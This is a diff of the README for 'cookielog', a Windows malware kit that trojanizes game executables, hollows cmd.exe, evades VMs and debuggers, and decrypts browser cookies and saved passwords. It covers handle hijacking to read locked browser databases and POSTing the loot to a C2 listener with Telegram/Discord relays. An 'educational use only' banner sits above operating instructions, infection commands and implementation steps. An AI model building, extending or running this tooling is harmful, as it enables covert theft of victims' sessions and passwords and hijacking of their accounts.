@@ -1,25 +1,25 @@
 # cookielog
 
 ```
- ╔══════════════════════════════════════════════════════════════════════╗
- ║                                                                      ║
- ║   EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING          ║
- ║                                                                      ║
- ║   This is offensive security tooling for penetration testing,        ║
- ║   red-team exercises, and security education. It builds an           ║
- ║   infected executable that extracts browser cookies from a           ║
- ║   target machine and exfiltrates them to a remote C2 server.         ║
- ║                                                                      ║
- ║   ONLY use this on systems you own or are explicitly authorized      ║
- ║   to test. Unauthorized use against third-party systems, networks,   ║
- ║   or individuals is illegal in most jurisdictions and may result     ║
- ║   in criminal prosecution.                                           ║
- ║                                                                      ║
- ║   The authors are not responsible for misuse. This code is           ║
- ║   provided for learning how cookie-stealing attacks work so          ║
- ║   that defenders can build detection and mitigation.                 ║
- ║                                                                      ║
- ╚══════════════════════════════════════════════════════════════════════╝
+ +----------------------------------------------------------------------+
+ |                                                                      |
+ |   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING         |
+ |                                                                      |
+ |   This is offensive security tooling for penetration testing,        |
+ |   red-team exercises, and security education. It builds an           |
+ |   infected executable that extracts browser cookies from a           |
+ |   target machine and exfiltrates them to a remote C2 server.         |
+ |                                                                      |
+ |   ONLY use this on systems you own or are explicitly authorized      |
+ |   to test. Unauthorized use against third-party systems, networks,   |
+ |   or individuals is illegal in most jurisdictions and may result     |
+ |   in criminal prosecution.                                           |
+ |                                                                      |
+ |   The authors are not responsible for misuse. This code is           |
+ |   provided for learning how cookie-stealing attacks work so          |
+ |   that defenders can build detection and mitigation.                 |
+ |                                                                      |
+ +----------------------------------------------------------------------+
 ```
 
 Cookie exfiltration toolkit for Windows. Steals cookies from Chromium-based browsers
@@ -35,7 +35,7 @@ included for direct extraction without injection.
 
 ## Installation
 
-Run the installer — it installs all dependencies automatically:
+Run the installer -- it installs all dependencies automatically:
 
 ```bat
 install.bat              :: install everything (Python, MSVC, CLI tools, build)
@@ -46,14 +46,14 @@ install.bat --no-tools   :: skip CLI tools (fzf, bat, ripgrep, clink)
 
 What `install.bat` does:
 
-1. **Python pip packages** — `cryptography`, `websocket-client` from `requirements.txt`
-2. **MSVC Build Tools 2022** — C++ workload via winget (~2 GB download, needed to compile the
+1. **Python pip packages** -- `cryptography`, `websocket-client` from `requirements.txt`
+2. **MSVC Build Tools 2022** -- C++ workload via winget (~2 GB download, needed to compile the
    payload). Python tools work without MSVC; you only need it to run `build.bat`.
-3. **CLI tools** — Clink (cmd autocomplete), fzf (fuzzy finder), bat (syntax-highlighted cat),
-   ripgrep (fast grep) — all via winget
-4. **cmd_init.cmd** — copies to `%USERPROFILE%\bin\` and sets the `AutoRun` registry key so
+3. **CLI tools** -- Clink (cmd autocomplete), fzf (fuzzy finder), bat (syntax-highlighted cat),
+   ripgrep (fast grep) -- all via winget
+4. **cmd_init.cmd** -- copies to `%USERPROFILE%\bin\` and sets the `AutoRun` registry key so
    Linux-style aliases (`ls`, `cat`, `grep`, etc.) load on every cmd.exe start
-5. **Build** — runs `build.bat` to compile `loader.exe` + `ckdll.dll` (if MSVC is available)
+5. **Build** -- runs `build.bat` to compile `loader.exe` + `ckdll.dll` (if MSVC is available)
 
 After installation, start cookielog with:
 
@@ -66,14 +66,14 @@ auto.bat
 ## Relay: Telegram & Discord
 
 The listener (`listen.py`) can forward a summary of every received cookie batch to
-Telegram or Discord. This is useful when the attacker's C2 port is firewalled —
+Telegram or Discord. This is useful when the attacker's C2 port is firewalled --
 the payload still POSTs to your listener over HTTP, and the listener re-sends a
 summary to Telegram/Discord over HTTPS (which passes most firewalls).
 
-Both relays are **optional** — if no `--telegram` or `--discord` flag is passed,
+Both relays are **optional** -- if no `--telegram` or `--discord` flag is passed,
 the listener just saves cookies to `loot/` as usual.
 
-**Keys are saved automatically** — the first time you pass `--telegram` or `--discord`,
+**Keys are saved automatically** -- the first time you pass `--telegram` or `--discord`,
 the value is stored in `config.json`. On subsequent runs, just run `python auto.py`
 without the flag and the saved key is loaded automatically.
 
@@ -110,7 +110,7 @@ python auto.py --clear-discord      :: remove saved Discord webhook
    python auto.py "GET UPSTAIRS (64bit)" --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
    ```
 
-   After the first run, the key is saved — next time just:
+   After the first run, the key is saved -- next time just:
    ```bat
    python auto.py "GET UPSTAIRS (64bit)"
    ```
@@ -125,16 +125,16 @@ python auto.py --clear-discord      :: remove saved Discord webhook
      145  youtube.com
       89  github.com
       ...
-   Full JSON: loot/cookies.json
+   Full JSON: loot/all_cookies.json
    ```
 
 ### Discord setup
 
 1. **Create a webhook** (takes 10 seconds):
    - Open Discord, go to the server where you want notifications
-   - **Server Settings** → **Integrations** → **Webhooks** → **New Webhook**
+   - **Server Settings** -> **Integrations** -> **Webhooks** -> **New Webhook**
    - Pick a name (e.g. "cookielog"), pick a channel
-   - Click **Copy Webhook URL** — it looks like:
+   - Click **Copy Webhook URL** -- it looks like:
      ```
      https://discord.com/api/webhooks/1234567890/abc-def-ghi...
      ```
@@ -170,21 +170,63 @@ python auto.py "GET UPSTAIRS (64bit)" --telegram 7123456789:AAH...:987654321 --d
 ### Notes
 
 - The relay sends a **summary** (top 15 domains + cookie count), not the full cookie
-  JSON — the full data is still saved in `loot/cookies.json` on the listener side.
+  JSON -- the full data is still saved in `loot/all_cookies.json` on the listener side.
 - Discord has a 2000-character message limit; the summary is truncated to 1900 chars.
-- The relay uses Python's `urllib.request` (HTTPS) — no extra pip packages needed.
+- The relay uses Python's `urllib.request` (HTTPS) -- no extra pip packages needed.
 - If the relay fails (bad token, wrong chat ID, network error), the listener logs
-  the error but **still saves cookies locally** — no data is lost.
+  the error but **still saves cookies locally** -- no data is lost.
 
 ---
 
 ## What's New
 
-### v2 — payload improvements (current)
+### v3 -- handle hijacking (current)
+
+**Browser-locked DB extraction without closing the browser.** Vivaldi (and some
+Chrome/Edge configurations) hold a 0-sharing lock on the cookie/password SQLite DB,
+causing `CreateFileW` to fail with error 32 (`ERROR_SHARING_VIOLATION`). The payload
+now falls back to **handle hijacking**: it enumerates all system handles via
+`NtQuerySystemInformation(SystemExtendedHandleInformation)`, finds the browser
+process's file handle to the SQLite DB, duplicates it with `DUPLICATE_SAME_ACCESS`
+(`GENERIC_READ` fails because the browser's handle lacks `READ_CONTROL`), reads
+the file in 64KB chunks via `ReadFile`, and verifies the expected table (`cookies`
+or `logins`) exists. This extracts cookies from a running browser without closing it.
+
+Test result: 1741 cookies (680 Firefox + 1061 Vivaldi) + 82 passwords + 57 session
+cookies (chatgpt.com, github.com, x.com, steamcommunity.com, claude.ai, discord.com,
+youtube.com, deepl.com, soundcloud.com, etc) extracted from Vivaldi while it was
+running with 30 processes.
+
+**Buffer increase.** `g_out` (the JSON output buffer) was increased from 512KB to 2MB.
+With Vivaldi cookies added, the total exceeded 512KB, which silently dropped the
+closing `]` bracket (the `Put()` function discards writes past the buffer end),
+producing invalid JSON that the listener rejected.
+
+**Loot file renaming.** The output files were renamed for clarity:
+- `cookies.json` -> `all_cookies.json` (cookies only, no passwords)
+- `cookies.txt` -> `all_cookies.txt` (Netscape format of the above)
+- New: `passwords.json` + `passwords.txt` (saved passwords with usernames)
+- `session_cookies.json` (real session cookies: `expirationDate == 0` and `name != "password"`)
+- `session_cookies.txt` (Netscape format of the above)
+
+Previously, `cookies.json` mixed cookies and passwords, and `session_cookies.json`
+contained only passwords (because passwords have `expirationDate == 0`), which was
+backwards and misleading.
+
+**Hidden `~ck_bak.bin`.** The loader's backup file (created during rename-restore) is
+now marked `FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM`, so it doesn't appear in
+Explorer even with "show hidden files" enabled (requires "show protected system files").
+
+**GUI relay checkboxes.** The `auto.py` GUI replaced toggle buttons (ON/OFF) with
+checkboxes for Telegram/Discord. Keys are saved to `config.json` regardless of checkbox
+state; the checkbox only controls whether the relay is active for the current run.
+Previously, toggling off cleared the Entry field, which deleted the key from config.
+
+### v2 -- payload improvements
 
 **Chromium cookie fix (browser-locked DBs):** `CopyFileW` was replaced with
 `CreateFileW(FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)` + manual `ReadFile`.
-This bypasses the exclusive lock Chrome/Edge hold on their live cookie databases —
+This bypasses the exclusive lock Chrome/Edge hold on their live cookie databases --
 cookies are now extracted even when the browser is running (previously only Firefox worked).
 
 **More browsers:** Chromium, Thorium, CocCoc, and Yandex Browser added to the browser
@@ -199,11 +241,11 @@ them with the associated username and origin URL.
 
 **XOR-encrypted payload (reverted):** XOR encryption was tested but reverted because it made
 the C2 and persistence sentinels (`CKC2_DEADBEEF_`, `CKPR____`) unfindable in `loader.exe`,
-breaking C2 URL patching — the payload fell back to `drop.json` instead of HTTP. The DLL is
+breaking C2 URL patching -- the payload fell back to `drop.json` instead of HTTP. The DLL is
 now embedded as plaintext in `loader.exe`.
 
 **Anti-analysis:** The payload now checks for:
-- VM MAC address prefixes (VMware, VirtualBox, QEMU — Hyper-V excluded due to WSL false positive)
+- VM MAC address prefixes (VMware, VirtualBox, QEMU -- Hyper-V excluded due to WSL false positive)
 - Only checks physical adapters (type 6 Ethernet, type 71 Wireless); skips "Virtual"/"WSL" descriptions
 - Debuggers (`IsDebuggerPresent`, `CheckRemoteDebuggerPresent`)
 - Analysis processes (x64dbg, IDA, Wireshark, Process Hacker, etc.)
@@ -234,8 +276,9 @@ payload doesn't hang forever if the listener doesn't respond. Previously, a brok
 caused the payload thread to block indefinitely in `recv()`.
 
 **Session cookie filter:** `listen.py` now writes `loot/session_cookies.json` and
-`loot/session_cookies.txt` containing only session cookies (`expirationDate == 0` or
-`session == true`). Useful for targeting live session tokens.
+`loot/session_cookies.txt` containing only real session cookies (`expirationDate == 0`
+and `name != "password"`). Previously, passwords (which also have `expirationDate == 0`)
+were mixed in, making the session file misleading. Passwords are now in `loot/passwords.json`.
 
 **Interactive terminal mode:** `python auto.py` with no args now asks: [1] GUI, [2] Terminal,
 [3] Quick infect. Terminal mode has an `input()` loop with commands: `infect`, `gui`,
@@ -251,7 +294,7 @@ button, and auto-loaded on subsequent runs.
 buttons (ON/OFF) and a SAVE RELAY SETTINGS button. Toggling off clears the field; toggling on
 restores from config.
 
-### v1 — `auto.py` one-click setup (GUI + CLI)
+### v1 -- `auto.py` one-click setup (GUI + CLI)
 
 A single script that does everything: builds binaries, detects your IP, starts the listener,
 infects the target, and optionally runs it locally for testing. Replaces the manual
@@ -266,10 +309,10 @@ python auto.py game.exe --run --port 9420   :: custom port + local test
 ```
 
 GUI has 4 buttons:
-- **SELECT FOLDER (game/app with files)** — copies the folder, finds the main .exe, infects in place
-- **SELECT FOLDER + RUN LOCALLY (test)** — same, then runs it on your machine
-- **SELECT .EXE (standalone, no folder)** — infects a single .exe
-- **SELECT .EXE + RUN LOCALLY (test)** — same, then runs it
+- **SELECT FOLDER (game/app with files)** -- copies the folder, finds the main .exe, infects in place
+- **SELECT FOLDER + RUN LOCALLY (test)** -- same, then runs it on your machine
+- **SELECT .EXE (standalone, no folder)** -- infects a single .exe
+- **SELECT .EXE + RUN LOCALLY (test)** -- same, then runs it
 
 ### `ifec/folds/` and `ifec/apps/` output structure
 
@@ -291,7 +334,7 @@ main .exe (Unity `<name>_Data/` heuristic, fallback to largest .exe, skips helpe
 `UnityCrashHandler`), and overwrites it with the infected version. The original source folder
 is never touched.
 
-### `listen.py` — fast startup fix
+### `listen.py` -- fast startup fix
 
 `HTTPServer.server_bind()` was overridden to skip `socket.getfqdn("0.0.0.0")`, which does a
 reverse DNS lookup that takes **4+ seconds** on Windows. This delayed `listen()` enough that
@@ -299,7 +342,7 @@ the payload's HTTP connect failed with `WSAECONNREFUSED` (10061). The fix calls
 `TCPServer.server_bind()` directly and uses `socket.gethostname()` (local, instant). The
 listener now reaches `LISTENING` state in under 1 second.
 
-### `auto.py --run` — restore fix
+### `auto.py --run` -- restore fix
 
 The original .exe restore after a local test was failing with `WinError 32` (file locked). Root
 cause: the **game process** (launched by the loader's rename-restore) holds the file lock, not
@@ -309,16 +352,16 @@ targeted cleanup of the orphaned `cmd.exe` by `ParentProcessId` (PowerShell, not
 
 ### Other changes
 
-- **`install.bat`** — one-click dependency installer: Python pip packages, MSVC Build Tools,
+- **`install.bat`** -- one-click dependency installer: Python pip packages, MSVC Build Tools,
   CLI tools (Clink, fzf, bat, ripgrep) via winget, `cmd_init.cmd` setup, autorun registry,
   and payload build. Supports `--check` (status only), `--no-build`, `--no-tools`.
-- **`auto.bat`** — shortcut: `python auto.py %*`
-- **`cmd_init.cmd`** — Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`, `...`) +
+- **`auto.bat`** -- shortcut: `python auto.py %*`
+- **`cmd_init.cmd`** -- Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`, `...`) +
   cookielog shortcuts (`cl_auto`, `cl_pick`, `cl_listen`) + Python shortcuts (`py`, `pi`, `pf`).
   Installed to `%USERPROFILE%\bin\cmd_init.cmd` with autorun registry key.
-- **`PAYLOAD_STEPS.txt`** (English) and **`PAYLOAD_STEPS_PTBR.txt`** (Portuguese) — step-by-step
+- **`PAYLOAD_STEPS.txt`** (English) and **`PAYLOAD_STEPS_PTBR.txt`** (Portuguese) -- step-by-step
   walkthrough of the payload execution chain (267 lines each).
-- **`swap.py --session`** — renamed from `--sessao` to English.
+- **`swap.py --session`** -- renamed from `--sessao` to English.
 - **All comments, docstrings, and UI strings** translated to English across all source files.
 
 ---
@@ -327,43 +370,45 @@ targeted cleanup of the orphaned `cmd.exe` by `ParentProcessId` (PowerShell, not
 
 ```
 cookielog/
-├── DISCLAIMER            # Educational use disclaimer (read this first)
-├── install.bat           # One-click dependency installer (Python, MSVC, CLI tools)
-├── auto.py               # One-click: build + listen + infect + test (GUI + CLI)
-├── auto.bat              # Shortcut: python auto.py %*
-├── pick.py               # GUI infector (standalone, manual C2 config)
-├── listen.py             # HTTP listener: receives exfiltrated cookies
-├── tg_chatid.py          # Helper: finds Telegram chat ID from bot token
-├── sink.py               # Named pipe server (local fallback, no C2 needed)
-├── swap.py               # Splits cookies by site (per-site cookies.txt)
-├── cookielog.py          # Legacy Python extractor (SQLite + DPAPI + AES-GCM)
-├── build.bat             # Compiles ckdll.dll + loader.exe (needs MSVC)
-├── start_attack.bat      # Starts listener + pick.py GUI together
-├── test_curl.bat         # Tests listener with curl
-├── cmd_init.cmd          # Linux-style aliases for cmd.exe
-├── PAYLOAD_STEPS.txt     # Payload execution walkthrough (English)
-├── PAYLOAD_STEPS_PTBR.txt # Payload execution walkthrough (Portuguese)
-├── requirements.txt      # Python deps
-├── config.json           # Saved API keys (auto-generated, gitignored)
-├── .gitignore
-├── src/
-│   ├── ckdll.cpp         # Payload DLL (CRT-less, injectable)
-│   ├── loader.cpp        # Loader (process hollowing + rename-restore)
-│   ├── payload.h         # Generated byte array of the DLL (auto-generated)
-│   └── gen.ps1           # Generates payload.h from ckdll.dll
-├── bin/                  # Build output
-│   ├── loader.exe        # ~143 KB
-│   └── ckdll.dll         # ~25 KB
-├── ifec/                 # Infected outputs (gitignored)
-│   ├── folds/            # Folder-mode infections (game + dependencies)
-│   └── apps/             # Standalone infections (single .exe)
-├── loot/                 # Captured cookies (gitignored)
-│   ├── cookies.json      # Cookie-Editor JSON (from listen.py)
-│   ├── cookies.txt       # Netscape format (from listen.py)
-│   ├── cookies_all.json  # From sink.py (pipe mode)
-│   └── cookies_all.txt   # From sink.py (pipe mode)
-└── tools/
-    └── PsExec64.exe      # Sysinternals (for legacy v20 extraction)
+|-- DISCLAIMER            # Educational use disclaimer (read this first)
+|-- install.bat           # One-click dependency installer (Python, MSVC, CLI tools)
+|-- auto.py               # One-click: build + listen + infect + test (GUI + CLI)
+|-- auto.bat              # Shortcut: python auto.py %*
+|-- pick.py               # GUI infector (standalone, manual C2 config)
+|-- listen.py             # HTTP listener: receives exfiltrated cookies
+|-- tg_chatid.py          # Helper: finds Telegram chat ID from bot token
+|-- sink.py               # Named pipe server (local fallback, no C2 needed)
+|-- swap.py               # Splits cookies by site (per-site cookies.txt)
+|-- cookielog.py          # Legacy Python extractor (SQLite + DPAPI + AES-GCM)
+|-- build.bat             # Compiles ckdll.dll + loader.exe (needs MSVC)
+|-- start_attack.bat      # Starts listener + pick.py GUI together
+|-- test_curl.bat         # Tests listener with curl
+|-- cmd_init.cmd          # Linux-style aliases for cmd.exe
+|-- PAYLOAD_STEPS.txt     # Payload execution walkthrough (English)
+|-- PAYLOAD_STEPS_PTBR.txt # Payload execution walkthrough (Portuguese)
+|-- requirements.txt      # Python deps
+|-- config.json           # Saved API keys (auto-generated, gitignored)
+|-- .gitignore
+|-- src/
+|   |-- ckdll.cpp         # Payload DLL (CRT-less, injectable)
+|   |-- loader.cpp        # Loader (process hollowing + rename-restore)
+|   |-- payload.h         # Generated byte array of the DLL (auto-generated)
+|   `-- gen.ps1           # Generates payload.h from ckdll.dll
+|-- bin/                  # Build output
+|   |-- loader.exe        # ~156 KB
+|   `-- ckdll.dll         # ~46 KB
+|-- ifec/                 # Infected outputs (gitignored)
+|   |-- folds/            # Folder-mode infections (game + dependencies)
+|   `-- apps/             # Standalone infections (single .exe)
+|-- loot/                 # Captured cookies (gitignored)
+|   |-- all_cookies.json  # All cookies, Cookie-Editor JSON (no passwords)
+|   |-- all_cookies.txt   # All cookies, Netscape format
+|   |-- passwords.json    # Saved passwords with usernames
+|   |-- passwords.txt     # Saved passwords (tab-separated)
+|   |-- session_cookies.json # Session-only cookies (expirationDate == 0)
+|   `-- session_cookies.txt  # Session-only, Netscape format
+`-- tools/
+    `-- PsExec64.exe      # Sysinternals (for legacy v20 extraction)
 ```
 
 ---
@@ -373,16 +418,16 @@ cookielog/
 ### One-click (recommended)
 
 ```bat
-:: GUI mode — pick a folder or .exe from a dialog
+:: GUI mode -- pick a folder or .exe from a dialog
 python auto.py
 
-:: CLI — infect a game folder (copies to ifec/folds/, infects in place)
+:: CLI -- infect a game folder (copies to ifec/folds/, infects in place)
 python auto.py "C:\Games\GET UPSTAIRS (64bit)"
 
-:: CLI — infect + run locally for testing
+:: CLI -- infect + run locally for testing
 python auto.py "C:\Games\GET UPSTAIRS (64bit)" --run
 
-:: CLI — infect a standalone .exe (output to ifec/apps/)
+:: CLI -- infect a standalone .exe (output to ifec/apps/)
 python auto.py "C:\Tools\app.exe"
 ```
 
@@ -436,15 +481,15 @@ The end-to-end infection and exfiltration chain:
 6. **Exfiltration.** The payload sends the cookies via HTTP POST (Winsock2) to the attacker's
    C2 URL as Cookie-Editor JSON.
 7. **Reception.** `listen.py` receives the JSON, merges/dedups against the existing collection
-   (keyed on `domain`+`name`+`path`), and writes `loot/cookies.json` + `loot/cookies.txt`.
-8. **Import.** The attacker imports `loot/cookies.json` into their own browser via the
+   (keyed on `domain`+`name`+`path`), and writes `loot/all_cookies.json` + `loot/all_cookies.txt`.
+8. **Import.** The attacker imports `loot/all_cookies.json` into their own browser via the
    Cookie-Editor extension.
 
 ---
 
 ## Usage reference
 
-### `auto.py` — one-click setup
+### `auto.py` -- one-click setup
 
 ```bat
 python auto.py                              :: GUI (file/folder picker)
@@ -484,7 +529,7 @@ With no arguments, `auto.py` asks: [1] GUI, [2] Terminal (interactive), [3] Quic
 
 In `--run` mode, the C2 URL is forced to `http://127.0.0.1:<port>/` for reliability.
 
-### `pick.py` — manual infector GUI
+### `pick.py` -- manual infector GUI
 
 ```bat
 python pick.py          :: GUI
@@ -495,7 +540,7 @@ Features: auto IP detection, C2 URL field, browse for .exe, infect, view JSON/TX
 `loot/`/`ifec/`/`drop.json`, rebuild, stop sink. Tag map for target classification
 (`bom`, `one-shot`, `risky`, `avoid`, `incompatible`, `out`).
 
-### `listen.py` — HTTP listener
+### `listen.py` -- HTTP listener
 
 ```bat
 python listen.py [port]    :: default port 8080
@@ -503,13 +548,14 @@ python listen.py [port]    :: default port 8080
 
 - Forces IPv4 (`HTTPServerV4` with `address_family = socket.AF_INET`)
 - Overrides `server_bind()` to skip `getfqdn()` (4s DNS delay fix)
-- Outputs: `loot/cookies.json` (Cookie-Editor) + `loot/cookies.txt` (Netscape)
-- Session filter: `loot/session_cookies.json` + `loot/session_cookies.txt` (session-only)
-- Web UI: `GET /` (summary), `GET /all` (JSON), `GET /session` (session JSON)
+- Outputs: `loot/all_cookies.json` (Cookie-Editor, no passwords) + `loot/all_cookies.txt` (Netscape)
+- Passwords: `loot/passwords.json` + `loot/passwords.txt` (saved passwords with usernames)
+- Session filter: `loot/session_cookies.json` + `loot/session_cookies.txt` (session-only, no passwords)
+- Web UI: `GET /` (summary), `GET /all` (JSON), `GET /passwords` (JSON), `GET /session` (session JSON)
 - Dedup by `(domain, name, path)`
 - Relay: `--telegram <bot_token:chat_id>` and `--discord <webhook_url>` forward summaries via HTTPS
 
-### `cookielog.py` — legacy extractor
+### `cookielog.py` -- legacy extractor
 
 Direct Python extraction with no injection. Reads browser SQLite databases directly and
 decrypts with DPAPI + AES-GCM. Works on Chrome <127, Edge, Brave, Vivaldi, Opera, and Firefox.
@@ -539,7 +585,7 @@ python cookielog.py
 
 Stage 2 writes the decrypted key to `C:\ProgramData\cookielog\v20.key`, which stage 3 reads.
 
-### `swap.py` — post-processing
+### `swap.py` -- post-processing
 
 Splits the captured cookies into per-site Netscape files for selective import:
 
@@ -555,7 +601,7 @@ Generates `swap\<site>.txt` in Netscape format, importable via Cookie-Editor -> 
 `--keep` gives session cookies an artificial expiry so the browser doesn't discard them on
 tab close; `--auth` keeps only cookies whose names match login/token patterns.
 
-### `build.bat` — compile
+### `build.bat` -- compile
 
 Compiles the payload DLL and the loader. Requires MSVC (`cl.exe`).
 
@@ -565,9 +611,9 @@ build.bat
 
 Produces:
 
-- `bin\ckdll.dll` — payload (~25 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`)
-- `bin\loader.exe` — loader (~143 KB, `/MT` static CRT, GUI subsystem)
-- `src\payload.h` — the DLL as a byte array, embedded into the loader
+- `bin\ckdll.dll` -- payload (~46 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`)
+- `bin\loader.exe` -- loader (~156 KB, `/MT` static CRT, GUI subsystem)
+- `src\payload.h` -- the DLL as a byte array, embedded into the loader
 
 ### Testing the listener
 
@@ -591,10 +637,12 @@ test_curl.bat 9090
 | `ifec/folds/<name>/<name>.exe` | Infected exe (folder mode, with dependencies) | `auto.py` |
 | `ifec/apps/<name>.exe` | Infected exe (standalone mode) | `auto.py` |
 | `ifec/<name>.exe` | Infected exe (legacy, from `pick.py`) | `pick.py` |
-| `loot/cookies.json` | Cookie-Editor JSON (browser-importable) | `listen.py` |
-| `loot/cookies.txt` | Netscape format (curl/wget) | `listen.py` |
-| `loot/session_cookies.json` | Session-only cookies (Cookie-Editor JSON) | `listen.py` |
-| `loot/session_cookies.txt` | Session-only cookies (Netscape format) | `listen.py` |
+| `loot/all_cookies.json` | All cookies, Cookie-Editor JSON (browser-importable, no passwords) | `listen.py` |
+| `loot/all_cookies.txt` | All cookies, Netscape format (curl/wget) | `listen.py` |
+| `loot/passwords.json` | Saved passwords with usernames (JSON) | `listen.py` |
+| `loot/passwords.txt` | Saved passwords (tab-separated: domain, username, password) | `listen.py` |
+| `loot/session_cookies.json` | Session-only cookies, Cookie-Editor JSON | `listen.py` |
+| `loot/session_cookies.txt` | Session-only cookies, Netscape format | `listen.py` |
 | `loot/cookies_all.json` | All cookies JSON (pipe mode) | `sink.py` |
 | `loot/cookies_all.txt` | Netscape format (pipe mode) | `sink.py` |
 | `cookies_all.json` | All cookies JSON (repo root) | `cookielog.py` |
@@ -604,6 +652,7 @@ test_curl.bat 9090
 | `C:\ProgramData\cookielog\v20.key` | Decrypted Chrome v20 app-bound key | `cookielog.py --v20-usr` |
 | `C:\ProgramData\cookielog\drop.json` | Local fallback dump (no C2, no pipe) | `ckdll.dll` payload |
 | `C:\ProgramData\cookielog\debug.log` | Payload debug trace (built with `/DDEBUG`) | `ckdll.dll` payload |
+| `~ck_bak.bin` | Hidden backup of infected exe (created on victim, auto-deleted) | `loader.exe` |
 
 ---
 
@@ -613,15 +662,15 @@ test_curl.bat 9090
 
 The loader injects the payload by hollowing a fresh `cmd.exe`:
 
-1. `CreateProcessW(cmd.exe, CREATE_SUSPENDED | CREATE_BREAKAWAY_FROM_JOB)` — suspended, no
+1. `CreateProcessW(cmd.exe, CREATE_SUSPENDED | CREATE_BREAKAWAY_FROM_JOB)` -- suspended, no
    console window.
-2. `NtUnmapViewOfSection` — unmaps the original `cmd.exe` image at its base address.
+2. `NtUnmapViewOfSection` -- unmaps the original `cmd.exe` image at its base address.
 3. `VirtualAllocEx` at the payload's preferred `ImageBase`.
-4. `WriteProcessMemory` — writes the PE headers and each section from the embedded
+4. `WriteProcessMemory` -- writes the PE headers and each section from the embedded
    `g_payload[]` byte array.
-5. IAT fixup — resolves imports from system DLLs (same base in all processes of the session).
+5. IAT fixup -- resolves imports from system DLLs (same base in all processes of the session).
 6. `NtCreateThreadEx` with the `HIDE_FROM_DEBUGGER` (`0x1`) flag on the payload entry point.
-7. The main thread is **never resumed** — the original entry point was unmapped; resuming it
+7. The main thread is **never resumed** -- the original entry point was unmapped; resuming it
    would cause an access violation. The payload runs entirely on the remote thread.
 
 ### Infected .exe format
@@ -633,7 +682,7 @@ A standalone infected binary is the loader with the original host appended:
 ```
 
 On launch, the loader detects the trailing `CKLG` magic, reads `host_len`, extracts the
-original host bytes, and runs them. The original host file on disk is never modified — the
+original host bytes, and runs them. The original host file on disk is never modified -- the
 infected copy lives in `ifec/`.
 
 ### Rename-restore
@@ -680,9 +729,9 @@ Connection: close\r\n\r\n`) and the body is sent in 32 KB chunks.
 
 Exfiltration priority in the payload:
 
-1. **HTTP POST to C2** — if the sentinel was patched with a URL.
-2. **Named pipe** `\\.\pipe\ck_pipe` — if `sink.py` is running locally (20 retries, 250ms each).
-3. **Local file** `C:\ProgramData\cookielog\drop.json` — final fallback.
+1. **HTTP POST to C2** -- if the sentinel was patched with a URL.
+2. **Named pipe** `\\.\pipe\ck_pipe` -- if `sink.py` is running locally (20 retries, 250ms each).
+3. **Local file** `C:\ProgramData\cookielog\drop.json` -- final fallback.
 
 ### CRT-less payload DLL
 
@@ -690,8 +739,8 @@ Exfiltration priority in the payload:
 
 - `/NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000`
 - `/GUARD:NO /MACHINE:X64`, linked against `kernel32.lib crypt32.lib bcrypt.lib` only.
-- Custom `memcpy` / `memset` / `memmove` implementations (no CRT).
-- `/Od /Oi-` — **optimization disabled**. The compiler's SSE-vectorized `memcpy` crashes
+- Custom `memcpy` / `memset` / `memmove` / `memcmp` implementations (no CRT).
+- `/Od /Oi-` -- **optimization disabled**. The compiler's SSE-vectorized `memcpy` crashes
   inside the hollowed process; disabling intrinsics prevents that.
 
 `gen.ps1` converts the compiled `ckdll.dll` into `src/payload.h` (a `g_payload[]` byte array),
@@ -719,15 +768,15 @@ extension:
 
 `hostOnly` is `true` when the domain does not start with `.`. `session` is `true` when
 `expirationDate` is `0`. `sameSite` is normalized across browsers (Chromium encodes
-2=None/1=Strict/0=Lax; Firefox encodes 0=None/1=Lax/2=Strict — the payload translates both).
+2=None/1=Strict/0=Lax; Firefox encodes 0=None/1=Lax/2=Strict -- the payload translates both).
 
 ### Chromium cookie decryption
 
 Chromium stores cookie values encrypted with AES-256-GCM:
 
-1. **v10/v11 key** — the `encrypted_key` in `Local State` is base64 + DPAPI-wrapped. The
+1. **v10/v11 key** -- the `encrypted_key` in `Local State` is base64 + DPAPI-wrapped. The
    payload calls `CryptUnprotectData` (user DPAPI) to recover the 32-byte key.
-2. **Cookie value** — `v10`/`v11`-prefixed blobs are decrypted with AES-256-GCM via CNG
+2. **Cookie value** -- `v10`/`v11`-prefixed blobs are decrypted with AES-256-GCM via CNG
    (`BCryptOpenAlgorithmProvider` / `BCryptGenerateSymmetricKey` / `BCryptDecrypt`): 3-byte
    prefix, 12-byte IV/nonce, ciphertext, 16-byte GCM tag.
 
@@ -741,30 +790,39 @@ decryption is needed; the payload reads `name`, `value`, `host`, `path`, `expiry
 
 Browsers hold a lock on their live `Cookies` SQLite database. The payload uses `CopyFileShared()`
 which calls `CreateFileW(FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)` + manual `ReadFile`
-instead of `CopyFileW`. This bypasses most browser locks — Firefox and Chrome work even while
+instead of `CopyFileW`. This bypasses most browser locks -- Firefox and Chrome work even while
 the browser is running.
 
-**Vivaldi exception:** Vivaldi holds a 0-sharing lock (no share flags at all) on its cookie DB,
-so even `CopyFileShared` fails with error 32 (`ERROR_SHARING_VIOLATION`). Vivaldi cookies can
-only be extracted when the browser is closed. The payload logs `CopyFileShared: CreateFileW
-failed (err): 32` and skips that browser.
+**Handle hijacking (0-sharing locks).** Vivaldi holds a 0-sharing lock (no share flags at all)
+on its cookie DB, so even `CopyFileShared` fails with error 32. When this happens, the payload
+falls back to `HijackCookieDB()`:
+
+1. `NtQuerySystemInformation(0x40)` enumerates all system handles (~306k handles, 12MB buffer).
+2. Filters handles belonging to the browser process (`vivaldi.exe`, `chrome.exe`, etc.).
+3. Duplicates each file handle with `DUPLICATE_SAME_ACCESS` -- not `GENERIC_READ`, because
+   Vivaldi's handle has `FILE_READ_DATA` but not `READ_CONTROL`, so `GENERIC_READ` fails.
+4. Reads the first 16 bytes and checks for the `SQLite format 3\x00` magic.
+5. Reads the full file via `ReadFile` in 64KB chunks to a temp path.
+6. Opens with sqlite3 and verifies the expected table (`cookies` or `logins`) exists.
+
